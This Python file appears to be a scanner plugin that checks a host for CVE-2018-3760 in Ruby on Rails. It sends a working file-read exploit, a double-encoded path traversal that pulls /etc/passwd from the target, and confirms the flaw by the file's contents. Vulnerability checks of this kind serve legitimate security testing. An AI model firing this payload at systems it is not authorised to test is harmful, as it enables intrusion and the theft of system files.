# -*- coding:utf-8 -*-

import re
import json
import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if Ruby On Rails arbitrary remote file reading access vul(cve-2018-3760)')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
        'Accept': '*/*'
    }
    check_url = url + '/assets/file:%2f%2f/etc/passwd'
    try:
        resp = requests.get(url=check_url, timeout=4, verify=False, headers=headers)
        if '/etc/passwd is no longer under a load path' in resp.text:
            find_re = re.search(r'no longer under a load path: .*,', resp.text)
            if find_re:
                allower_path = find_re.group().split(', ')[1]
                URL = '%s/assets/file:%s%s%s/etc/passwd' % (url, '%2f%2f', allower_path, str('/%252e%252e') * allower_path.count('/'))
                response = requests.get(url=URL, timeout=4, headers=headers, verify=False)
                if 'root:x:0:0:root:/root:' in response.text and response.status_code == 200:
                    msg = 'There is Ruby On Rails arbitrary remote file reading access vul(cve-2018-3760) on url: ' + URL + ' .'
                    number = 'v127'
                    print(msg)
                    return True, url, number, msg
                else:
                    pass
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no Ruby On Rails arbitrary remote file reading access vul(cve-2018-3760)'
    number = 'v0'
    return False, url, number, msg
